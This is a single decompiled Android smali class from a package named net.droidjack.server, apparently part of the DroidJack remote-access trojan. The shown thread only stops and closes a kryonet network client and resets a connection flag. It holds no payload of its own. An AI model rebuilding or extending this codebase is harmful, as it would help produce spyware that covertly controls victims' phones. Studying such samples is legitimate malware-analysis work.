.class Lnet/droidjack/server/v;
.super Ljava/lang/Thread;


# direct methods
.method constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 1

    :try_start_0
    sget-object v0, Lnet/droidjack/server/Controller;->u:Lcom/esotericsoftware/kryonet/Client;

    invoke-virtual {v0}, Lcom/esotericsoftware/kryonet/Client;->stop()V

    sget-object v0, Lnet/droidjack/server/Controller;->u:Lcom/esotericsoftware/kryonet/Client;

    invoke-virtual {v0}, Lcom/esotericsoftware/kryonet/Client;->close()V

    const/4 v0, 0x0

    sput-boolean v0, Lnet/droidjack/server/Controller;->x:Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method
